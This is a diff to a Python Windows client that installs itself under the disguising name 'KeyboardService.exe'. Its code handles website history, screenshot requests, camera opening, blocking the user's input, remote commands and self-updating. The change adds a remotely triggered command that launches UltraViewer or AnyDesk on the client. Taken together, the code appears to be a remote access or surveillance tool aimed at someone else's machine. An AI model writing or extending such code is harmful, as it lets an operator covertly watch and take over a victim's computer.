@@ -50,7 +50,7 @@ WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.2.25"
+APP_VERSION = "1.0.0.0.01"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1160,7 +1160,7 @@ def open_message_document(message):
 
 def release_input_block(stop_event, ready_event, result, duration):
     global input_block_timer, input_block_stop_event
-    user32 = ctypes.WinDLL("user32", use_last_error=True)
+    user32 = ctypes.windll.user32
     user32.BlockInput.argtypes = [wintypes.BOOL]
     user32.BlockInput.restype = wintypes.BOOL
     try:
@@ -1255,6 +1255,8 @@ def handle_device_command(command, command_id=None, message=""):
             close_all_visible_apps()
         elif command == "open_ultraviewer":
             open_ultraviewer()
+        elif command == "open_remote_app":
+            open_remote_app(message)
         elif command == "autofill":
             if os.name != "nt":
                 raise RuntimeError("Autofill is only supported on Windows")
@@ -1370,25 +1372,50 @@ def open_camera_app(duration):
         time.sleep(0.25)
 
 
-def open_ultraviewer():
+def open_remote_app(app_name):
     if os.name != "nt":
-        raise RuntimeError("UltraViewer is only supported on Windows")
+        raise RuntimeError("Remote desktop apps are only supported on Windows")
 
-    candidates = [
-        os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "UltraViewer", "UltraViewer.exe"),
-        os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "UltraViewer", "UltraViewer.exe"),
-        os.path.join(os.environ.get("LOCALAPPDATA", ""), "UltraViewer", "UltraViewer.exe"),
-    ]
+    normalized_app = str(app_name or "").strip().lower()
+    app_definitions = {
+        "ultraviewer": (
+            "UltraViewer",
+            [
+                os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "UltraViewer", "UltraViewer.exe"),
+                os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "UltraViewer", "UltraViewer.exe"),
+                os.path.join(os.environ.get("LOCALAPPDATA", ""), "UltraViewer", "UltraViewer.exe"),
+            ],
+            ["UltraViewer.exe", "UltraViewer"],
+        ),
+        "anydesk": (
+            "AnyDesk",
+            [
+                os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "AnyDesk", "AnyDesk.exe"),
+                os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "AnyDesk", "AnyDesk.exe"),
+                os.path.join(os.environ.get("LOCALAPPDATA", ""), "AnyDesk.exe"),
+            ],
+            ["AnyDesk.exe", "AnyDesk"],
+        ),
+    }
+    app_definition = app_definitions.get(normalized_app)
+    if not app_definition:
+        raise RuntimeError("Choose UltraViewer or AnyDesk")
+    display_name, candidates, executable_names = app_definition
+
     executable = next((path for path in candidates if path and os.path.isfile(path)), None)
     if not executable:
-        executable = shutil.which("UltraViewer.exe") or shutil.which("UltraViewer")
+        executable = next((shutil.which(name) for name in executable_names if shutil.which(name)), None)
     if not executable:
-        raise RuntimeError("UltraViewer is not installed on this client")
+        raise RuntimeError(f"{display_name} is not installed on this client")
 
     try:
         subprocess.Popen([executable], cwd=os.path.dirname(executable), close_fds=True)
     except OSError as error:
-        raise RuntimeError(f"UltraViewer could not be opened: {error}") from error
+        raise RuntimeError(f"{display_name} could not be opened: {error}") from error
+
+
+def open_ultraviewer():
+    open_remote_app("ultraviewer")
 
 
 def get_battery_telemetry():
@@ -1718,9 +1745,9 @@ def install_and_relaunch():
 
 
 def version_tuple(value):
-    match = re.search(r"(?:v)?(\d+)(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?", value or "")
+    match = re.search(r"(?:v)?(\d+)(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?", value or "")
     if not match:
-        return (0, 0, 0, 0)
+        return (0, 0, 0, 0, 0)
     return tuple(int(part or 0) for part in match.groups())
 
 
